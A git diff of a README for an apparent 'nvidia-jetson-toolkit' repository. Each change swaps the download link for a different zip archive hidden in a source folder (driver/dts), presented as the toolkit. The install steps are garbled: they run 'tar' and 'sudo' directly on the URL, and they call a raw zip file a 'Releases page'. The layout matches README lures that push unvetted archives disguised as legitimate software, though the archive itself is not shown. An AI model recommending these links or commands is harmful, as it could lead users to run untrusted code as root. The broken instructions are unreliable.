@@ -14,13 +14,13 @@ Before downloading, ensure that you have the following:
 
 ## 📥 Download Link
 
-[![Download nvidia-jetson-toolkit](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip)](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip)
+[![Download nvidia-jetson-toolkit](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip)](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip)
 
 ## 📂 Download & Install
 
 To get started, visit the following link to download the toolkit:
 
-[Download the nvidia-jetson-toolkit here](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip)
+[Download the nvidia-jetson-toolkit here](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the toolkit.
@@ -39,11 +39,11 @@ After downloading the toolkit, follow these steps to install:
    ```
 4. **Extract the Toolkit**: Run the following command to extract the downloaded toolkit:
    ```
-   tar -xzvf https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip
+   tar -xzvf https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip
    ```
 5. **Run the Setup Script**: Verify the files extracted and run the setup script:
    ```
-   sudo https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip
+   sudo https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip
    ```
 6. **Follow On-Screen Prompts**: The script will guide you through any additional steps required for installation.
 
@@ -84,4 +84,4 @@ This toolkit is licensed under the MIT License. Please refer to the LICENSE file
 
 To download the latest version of the nvidia-jetson-toolkit, visit the link below:
 
-[Download the nvidia-jetson-toolkit here](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/src/jetson_toolkit_nvidia_2.7.zip)
+[Download the nvidia-jetson-toolkit here](https://github.com/mehani-dz/nvidia-jetson-toolkit/raw/refs/heads/main/jp62-imx708-rpi-v3/driver/dts/nvidia_toolkit_jetson_v3.9.zip)
